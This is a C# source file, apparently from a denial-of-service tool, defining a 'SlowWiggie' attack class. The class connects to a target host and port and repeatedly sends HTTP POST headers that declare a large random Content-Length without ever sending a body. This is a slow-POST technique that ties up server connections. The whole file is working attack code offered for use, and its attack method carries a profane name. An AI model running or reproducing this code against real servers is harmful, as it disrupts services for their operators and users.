using MechWarrior;
using System;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace MechWarriorAttack
{
    public class SlowWiggie : MechState, IDisposable
    {
        public SlowWiggie(string Host, int port, int pauseTime, bool repeat)
        {
            Site = Host;
            Port = port;

            Repeater = repeat;
            PauseTime = pauseTime;
            TClient = new TcpClient();
        }

        public string Site { get; }
        public int Port { get; }
        public bool Repeater { get; }
        public int PauseTime { get; }
        public TcpClient TClient { get; }

        public void Dispose()
        {
            try
            {
                TClient.GetStream().Dispose();
            }
            catch (Exception)
            {
            }
        }

        private static Random random = new();

        public override bool FuckEmThatsWhy()
        {
            int ContentLength = random.Next(4000, 15000);
            try
            {
                StateMessage = "Connecting";
                TClient.Connect(Site, Port);
                StateMessage = "Connected";
                StreamWriter writer = new(TClient.GetStream());
                do
                {
                    StateMessage = "Writing to Stream";
                    writer.Write($"POST / HTTP/1.1\r\nHost: {Site}\r\nContent-length: {ContentLength}\r\n\r\n");
                    StateMessage = "Flushing";
                    writer.Flush();
                    StateMessage = "Sleeping";
                    Thread.Sleep(PauseTime);
                } while (Repeater);
                StateMessage = "Finished";
                return true;
            }
            catch (Exception)
            {
                StateMessage = "Aborted by server";
                return false;
            }
        }
    }
}